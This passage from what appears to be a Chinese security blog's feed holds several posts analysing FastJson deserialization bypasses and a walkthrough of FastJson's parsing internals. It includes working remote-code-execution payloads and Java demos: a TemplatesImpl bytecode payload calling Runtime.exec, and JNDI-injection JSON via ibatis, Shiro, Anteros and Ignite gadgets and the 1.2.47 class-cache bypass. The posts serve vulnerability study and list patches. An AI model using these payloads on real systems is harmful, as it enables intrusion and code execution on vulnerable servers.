class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\"[&#123;\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p><img src="9.png" alt=""></p>
<p>从这个补丁可以看出，在1.2.44版本中，它删掉了原来的判断<code>LL</code>的方式，而是改为了若以<code>[</code>开头或以<code>;</code>结尾，都会抛出异常。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#1-2-43%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE" target="_blank" rel="noopener">Fastjson漏洞复现</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(五)</title>
    <url>/2020/05/16/fastjson-5/</url>
    <content><![CDATA[<p>1.2.44版本中对<code>L</code>和<code>[</code>开头的情况进行了防御，使得在1.2.44版本时并没有出现任何的checkAutoType的绕过。但是却出现了对于黑名单的绕过。本篇文章对此进行深入的分析。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>1.2.44 &lt;= fastjson &lt;= 1.2.45</li>
<li>fastjson &lt;=  1.2.43 (也可成立，需要添加ibatis第三方包，而在前面的版本中无需ibatis包也可RCE)</li>
</ul>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>打开autoType</li>
<li>具备ibatis第三方包</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>黑名单的绕过是使用了<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>这个类，使用这个类需要额外的加入<code>ibatis</code>第三方包。由于ibatis在项目中也经常使用，所以影响范围广。</p>
<p>先来看看这个类，定位到setProperties()函数，如下所示:</p>
<p><img src="1.png" alt=""></p>
<p>在该函数中我们可以看到，有着JNDI注入的完整的一套。接下来看看uri即<code>properties.getProperty(&quot;data_source&quot;)</code>是否可控。那就需要在整个的过程中也反序列化<code>getProperties()</code>传入的参数。定位到该函数</p>
<p><img src="2.png" alt=""></p>
<p>在该函数中会调用父类即HashMap.get(‘data_source’)，获取到值。因此，传入的Properties为一个具有<code>&quot;data_source&quot;:&quot;rmi://127.0.0.1:1099/EvilObject&quot;</code>key-value对的HashMap即可。</p>
<blockquote>
</blockquote>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><h3 id="JndiDataSourceFactory"><a href="#JndiDataSourceFactory" class="headerlink" title="JndiDataSourceFactory"></a>JndiDataSourceFactory</h3><p>根据以上分析，可得出EXP为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class="line">	&quot;properties&quot;:&#123;</span><br><span class="line">						&quot;data_source&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">				 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整的demo为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.44-1.2.45,ibatis&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jndiDataSourcefactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":&#123;\"data_source\":\"rmi://127.0.0.1:1099/EvilObject\"&#125;&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>补丁就是增加了黑名单</p>
<p><img src="3.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#1-2-45%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE" target="_blank" rel="noopener">Fastjson漏洞复现</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(七)</title>
    <url>/2020/05/17/fastjson-7/</url>
    <content><![CDATA[<p>此后从1.2.48-1.2.68都是基于黑名单绕过的思路来进行利用的。此次介绍fastjson&lt;=1.2.62版本和fastjson&lt;=1.2.66版本的利用方式。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>fastjson &lt;= 1.2.62</li>
</ul>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>开启autoType</li>
<li>依赖第三方包ibatis-sqlmap</li>
<li>依赖第三方包Jta</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先定位到<code>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</code>类的setProperties函数</p>
<p><img src="1.png" alt=""></p>
<p>可以看到有完整的一套jndi注入，只需要考虑utxName是否可控。utxName来源于props.get(“UserTransaction”)。因此需要传入一个Properties类，其UserTransaction的值为jndi注入的uri。</p>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><p>根据上述的分析，exp构造如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,</span><br><span class="line">  &quot;properties&quot;: &#123;</span><br><span class="line">                  &quot;UserTransaction&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>补丁的方式非常的简单粗暴，就是将此类加入黑名单中。</p>
<h1 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h1><h2 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>fastjson &lt;= 1.2.66</li>
</ul>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>开启autoType</li>
<li>依赖第三方包shiro</li>
<li>依赖第三方包slf4j-simple</li>
</ul>
<p>OR</p>
<ul>
<li>开启autoType</li>
<li>依赖第三方包Anteros-DBCP</li>
<li>依赖第三方包Anteros-Core</li>
</ul>
<p>OR</p>
<ul>
<li>开启autoType</li>
<li>依赖第三方包ignite-jta-incubating</li>
</ul>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="JndiObjectFactory"><a href="#JndiObjectFactory" class="headerlink" title="JndiObjectFactory"></a>JndiObjectFactory</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>先定位到<code>org.apache.shiro.jndi.JndiObjectFactory</code>类的getInstance()函数。</p>
<p><img src="2.png" alt=""></p>
<p>这里的this.lookup事实上也是调用了JndiTemplate.lookup()函数，满足jndi注入的环境。那么就需要控制this.resourceName的值为jndi注入的uri即可。</p>
<p>在利用这条链时，反序列化需要使用parseObject。因为parseObject需要返回JSONObject类型的对象，在使用toJSON进行转换的时候会遍历其字段，并调用getter获取value放入Map，从而调用到了getInstance方法。</p>
<h4 id="exp构造"><a href="#exp构造" class="headerlink" title="exp构造"></a>exp构造</h4><p>根据上述分析，exp如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,</span><br><span class="line">  &quot;resourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AnterosDBCPConfig"><a href="#AnterosDBCPConfig" class="headerlink" title="AnterosDBCPConfig"></a>AnterosDBCPConfig</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>首先定位到<code>br.com.anteros.dbcp.AnterosDBCPConfig</code>类，通过搜寻lookup函数，可以定位到其getObjectOrPerformJndiLookup()函数。</p>
<p><img src="3.png" alt=""></p>
<p>可以看到他有一个完整的JNDI注入环境。但是由于该函数是private类型，因此不能在反序列化时直接被调用，继续寻找一个调用此函数的方法。定位到setMetricRegistry()函数，如下所示:</p>
<p><img src="4.png" alt=""></p>
<p>它调用了getObjectOrPerformJndiLookup()函数。只需要将metricRegistry的值设置为jndi注入的uri值。</p>
<h4 id="exp构造-1"><a href="#exp构造-1" class="headerlink" title="exp构造"></a>exp构造</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,</span><br><span class="line">	&quot;metricRegistry&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="CacheJndiTmLookup"><a href="#CacheJndiTmLookup" class="headerlink" title="CacheJndiTmLookup"></a>CacheJndiTmLookup</h3><p>首先定位到<code>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</code>类。如下所示:</p>
<p><img src="5.png" alt=""></p>
<p>该类比较简单，在getTm()函数中存在JNDI注入的整个环境，其中jndi的uri即代码中的s来源于jndiNames，因此只需要将jndiNames中的值放入一个jndi注入的uri即可。</p>
<h4 id="exp构造-2"><a href="#exp构造-2" class="headerlink" title="exp构造"></a>exp构造</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,</span><br><span class="line">	&quot;jndiNames&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h2><p>增加黑名单。而且在1.2.68也就是最新版本中增加了新的安全参数Safe_mode。打开这个模式之后直接禁用autoType功能。虽然有这个Safe_mode，如果开启这个模式的话，相当于禁用了@type fastjson反序列化这个功能。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#%E7%89%88%E6%9C%AC1-2-47" target="_blank" rel="noopener">Fastjson历史补丁Bypass分析</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(六)</title>
    <url>/2020/05/17/fastjson-6/</url>
    <content><![CDATA[<p>1.2.46版本中将<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>添加进黑名单，使得利用失败。此时出现了不开启<code>autotype</code>的情况下成功的绕过checkAutoType，且通杀1.2.47以前的所有版本。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>fastjson &lt;= 1.2.47</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该漏洞是通过绕过了checkAutoType的检查，从而成功利用。这个时候先来看看之前提到过的四块。</p>
<p><img src="1.png" alt=""><br><img src="2.png" alt=""></p>
<p>之前在fastjson回顾系列二中利用的是autotype开启的情况下，最终进入红框的loadClass，从而RCE的。而此次利用的是autotype未开启的情况下，利用第二个绿色框来达到RCE的。接下来具体看看</p>
<p>它首先利用了<code>java.lang.class</code>这个类，它并不在黑名单，所以可以过checkAutotype。过了checkAutotype之后，它对应的deserializer为<code>MiscCodeC</code>。如下所示:</p>
<p><img src="3.png" alt=""></p>
<p>跟进deserialze函数</p>
<p><img src="4.png" alt=""></p>
<p>在经过判断lexer.stringVal()的值是”val”为真的情况下，经过parser.parse()，取出其值，即”com.sun.rowset.JdbcRowSetImpl”。如下所示:</p>
<p><img src="5.png" alt=""></p>
<p>接着往下走，经过一系列判断，最终到达<code>TypeUtils.loadClass</code>函数。</p>
<p><img src="6.png" alt=""></p>
<p>此时的strVal为前面获取到的”com.sun.rowset.JdbcRowSetImpl”，跟进它</p>
<p><img src="7.png" alt=""></p>
<p>由于cache值默认为<code>true</code>，则进入mapping.put(className,clazz)，将”com.sun.rowset.JdbcRowSetImpl”与com.sun.rowset.JdbcRowSetImpl类对应起来。</p>
<p>然后继续反序列化，直接解析到<code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</code>时，进入checkAutoType函数，由于autotype默认是关闭的，因此直接进入绿色的框，如下所示：</p>
<p><img src="8.png" alt=""></p>
<p>跟进getClassFromMapping()函数。</p>
<p><img src="9.png" alt=""></p>
<p>此时clazz为<code>com.sun.rowset.JdbcRowSetImpl</code>类从而直接return了。</p>
<p><img src="10.png" alt=""></p>
<p>到这里为止就绕过了checkAutoType的检查，后续就与之前一致了。</p>
<h1 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h1><p>根据上面的分析，exp分为2部分，一部分是将”com.sun.rowset.JdbcRowSetImpl”放入mapping中，另一个就是正常的获取到”com.sun.rowset.JdbcRowSetImpl”，且调用setAutoCommit函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;a&quot;:&#123;</span><br><span class="line">			&quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">			&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">	&quot;b&quot;:&#123;</span><br><span class="line">			&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">			&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">			&quot;autoCommit&quot;:true	</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整的demo:</p>
<p>jdbcrowsetimpl5</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.47&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;&#125;&#125;"</span>;</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>所有在黑名单中的类都可以用这种方式绕过，包括<code>TemplatesImpl</code>和<code>JndiDataSourceFactory</code></p>
</blockquote>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>1.2.48版本中修复了1.2.47的绕过，在MiscCodec，设置了cache为false。<br><img src="11.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#v1-2-47" target="_blank" rel="noopener">FastJson 反序列化学习#1.2.47</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化介绍</title>
    <url>/2020/05/20/fastjson-introduction/</url>
    <content><![CDATA[<p>之前虽然看了FastJson相关的内容，在复现的时候还是遇到了不少问题。因为比较详细地分析了下FastJson反序列化的过程，因此，记录了下来。</p>
<a id="more"></a>

<h2 id="FastJson简介"><a href="#FastJson简介" class="headerlink" title="FastJson简介"></a>FastJson简介</h2><p>FastJson自己实现了一套反序列化的机制，并没有使用默认的readObject()，在序列化反序列化的时候会进行一些操作，调用到一些setter和getter函数，从而造成命令执行。</p>
<h3 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h3><ul>
<li>序列化<ul>
<li>JSON.toJSONString()</li>
</ul>
</li>
<li>反序列化<ul>
<li>JSON.parse()   返回实际类型对象</li>
<li>JSON.parseObject()   返回JSONObject类型对象</li>
</ul>
</li>
</ul>
<blockquote>
<p>FastJson中提供特殊字段符<code>@type</code>。该字段可以指定反序列化任意类，并在反序列化过程中自动调用类中属性的公有的set、get、is方法。(这个is方法有待验证)</p>
</blockquote>
<p>根据很多的实验可知，反序列化的规律:</p>
<ul>
<li>该类的无参构造函数被调用</li>
<li>public修饰的属性直接反序列化成功</li>
<li>private修饰的属性调用setter方法进行赋值</li>
<li>getter函数会根据函数返回值不同，选择被调用或不被调用</li>
</ul>
<blockquote>
<p>若一定要反序列化私有属性，可以给parseObject方法加入<code>Feature.SupportNonPublicField</code>。加入之后，它的调用方式与parse()一样，而与parseObject()无关了。后面会分析到这一点。</p>
</blockquote>
<h3 id="反序列化的对比"><a href="#反序列化的对比" class="headerlink" title="反序列化的对比"></a>反序列化的对比</h3><p>在FastJson的反序列化过程中，最明显的是parse()和parseObject()进行反序列化时，有着很大的不同。<br>从下图可以看到，JSONObject()调用了parse()方法，只是在最后多了一个toJSON()方法，它在toJSON()方法里面对所有的getter方法进行调用。<br><img src="1.png" alt=""></p>
<p>除此之外，还有2个属性的影响:</p>
<ul>
<li>有无class类型</li>
<li>有无Feature.SupportNonPublicField属性</li>
</ul>
<h4 id="1-有无class类型"><a href="#1-有无class类型" class="headerlink" title="1.有无class类型"></a>1.有无class类型</h4><p><strong>无class类型</strong>: parseObject(str)  </p>
<ul>
<li>调用类的构造方法</li>
<li>所有属性的getter方法</li>
<li>所有属性的setter方法</li>
</ul>
<p><strong>有class类型</strong>: parseObject(str,*.class)  </p>
<ul>
<li>调用类的构造方法</li>
<li>非私有属性的setter方法</li>
<li>特定类型的getter方法。</li>
</ul>
<h4 id="2-有Feature-SupportNonPublicField属性"><a href="#2-有Feature-SupportNonPublicField属性" class="headerlink" title="2.有Feature.SupportNonPublicField属性"></a>2.有Feature.SupportNonPublicField属性</h4><p>添加了Feature的parseObject()实际上等同于添加了Feature的parse()方法<br><img src="2.png" alt=""></p>
<ul>
<li>调用类的构造方法</li>
<li>所有属性的setter方法</li>
<li>特定类型的getter方法</li>
</ul>
<h3 id="FastJson反序列化流程"><a href="#FastJson反序列化流程" class="headerlink" title="FastJson反序列化流程"></a>FastJson反序列化流程</h3><p>由于parseObject()只是比parse()多了个toJSON()的过程。整个反序列化分析流程就以parseObject()为例。</p>
<p>其中最主要的是DefaultJSONParser类，在该类中会调用很多其他的类来一起完成整个过程。来看看这个类。</p>
<h4 id="DefaultJSONParser"><a href="#DefaultJSONParser" class="headerlink" title="DefaultJSONParser"></a>DefaultJSONParser</h4><p>在这个里面有几个比较关键的类:</p>
<pre><code>+ JSONLexer
+ ParserConfig
+ JavaBeanDeserializer
+ JSONScanner
+ ObjectDeserializer</code></pre><p>首先进入parse()函数，在该函数中调用DefaultJSONParser的parse()函数。<br><img src="3.png" alt=""></p>
<p>进入DefaultJSONParser.parse()函数，会根据lexer.token的值来选择处理方式。这个lexter是继承自JSONLexerBase的JSONScanner。它对很多特殊符号如<code>{</code>、<code>[</code>等都赋了值。显然由于字符串的第一个字符为<code>{</code>,其token值为12。则进入DefaultJSONParser.parseObject()函数。</p>
<p>在这个中，它会循环处理字符串，摘取类似”name”:”123”这样的key-value对。拖在这个过程中存在symbolTable中的字段，就会进TypeUtils.loadClass()函数。在这个里面若经过了checkAutoType的检查之后。紧接着就会获取对应的deserializer。</p>
<p><img src="4.png" alt=""></p>
<p>简单来说就是根据获取的clazz获取对应的deserilizer。若在预定数组中的类，则可以调用相关类的<code>deserialze</code>方法完成反序列化操作。若没有，则进入asm创建处理类的流程。在获取deserializer之后，会调用其deserilze函数进行反序列化。</p>
<h4 id="JSON字符串的解析"><a href="#JSON字符串的解析" class="headerlink" title="JSON字符串的解析"></a>JSON字符串的解析</h4><p>Json字符串的核心处理流程是在DefaultJSONParser#parse中根据json字符串的标志位来进行分发的。</p>
<p>最开始的标志位为<code>{</code>。</p>
<pre><code>1. 判断下一个标志位是否为`&quot;`，若是则提取key值，这时的标志位为第二个`&quot;`。
2. 判断下一个标志位是否为`:`
    + 如果为`:`，则判断下一个标志位是否为`&quot;`，如果是，则获取value值，此时的标志位为`&quot;`
    + 如果为`{`，则重复1～2过程
3. 判断下一个标志位是否为`}`
    + 若为`}`则表示这一单元的解析结束
    + 若为`,`则表示要解析下一个嵌套数据，重复1～3</code></pre><p>根据不同的标志位进行不同的解析，当解析过程中遇到了<code>@type</code>或<code>$ref</code>时，将当作特殊的标志做相应的处理。</p>
<h4 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h4><p>这里进入了JavaBeanDeserializer类进行处理。在该类的构造函数中，将JavaBeanInfo中的信息，包括fieldList等放入了sortedFieldDeserializers中。</p>
<p>其deserialze这部分会遍历整个sortedFieldDeserializers中所有的key，并尝试根据类型来提取json字符串中相应的信息。若成功则转交给asm生成的处理类的createInstance实例化对象，若不成功则扫描json字符串中是否具有特殊指令集。</p>
<h4 id="获取Deserilizer"><a href="#获取Deserilizer" class="headerlink" title="获取Deserilizer"></a>获取Deserilizer</h4><p>跟进一下getDeserializer()函数。</p>
<p><img src="5.png" alt=""></p>
<p>首先会尝试在deserializers中匹配type，若有则直接返回。没有则调用getDeserializer继续处理。跟进getDeserializer()。这部分代码很长，当不匹配上面的各种情况时，会调用到createJavaBeanDeserializer来创建一个新的deserializer。跟进createJavaBeanDeserializer()。</p>
<p><img src="6.png" alt=""></p>
<p>然后将生成的deserializer将其加入deserializers这个map。</p>
<h4 id="JavaBeanInfo"><a href="#JavaBeanInfo" class="headerlink" title="JavaBeanInfo"></a>JavaBeanInfo</h4><p>在进入build函数后，会遍历一遍传入所有方法，寻找满足set开头的特定类型方法。setter方法的要求:</p>
<ul>
<li>方法名长度大于4且以set开头，且第四个字母需要大写</li>
<li>非静态方法</li>
<li>返回类型为void或者当前类</li>
<li>参数个数为1</li>
</ul>
<p>获取符合条件的setter方法后，再获取propertyName。</p>
<ul>
<li>若第四个字符是大写的，则将其变为小写，然后获取propertyName值</li>
<li>若第四个字符为<code>_</code>，直接获取<code>_</code>之后的值，然后同第一个一样处理</li>
<li>若第四个字符为<code>f</code>，则直接去掉set即可</li>
</ul>
<p>然后判断获取到的propertyName是否在类成员变量中。如果不在并且其返回值为Boolean类型，就将其propertyName第一个字母大写，且加上<code>is</code>作为新的propertyName，去查找是否存在此成员变量。</p>
<p><img src="7.png" alt=""></p>
<p>当找到成员变量后，就将其放入fieldList中，放入的是一个FieldInfo对象，包括了(propertyName,method,field,clazz,type)等的信息。</p>
<p>然后再次遍历所有方法，寻找到满足get开头方法。然后getter方法要求如下:</p>
<ul>
<li>函方法名长度大于4且以get开头，且第四个字母需要大写</li>
<li>非静态方法</li>
<li>函数没有入口参数</li>
<li>继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li>
</ul>
<p>将第四个字母转为小写，然后将去掉get的值作为propertyName，然后从fieldList中查找是否存在该propertyName对应的fieldInfo。如果没有，则将该propertyName与此get方法的信息加入fieldList，其中field为null。<br><img src="8.png" alt=""></p>
<p>遍历完所有的setter和getter方法后，就获取到了一个JavaBeanInfo对象，里面包括了该过程中生成的fieldList。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://xz.aliyun.com/t/7027#toc-23" target="_blank" rel="noopener">JAVA反序列化—FastJson组件</a></li>
<li><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">Fastjson 流程分析及 RCE 分析</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>Hash长度扩展攻击</title>
    <url>/2020/05/24/hash-length-extension-attack/</url>
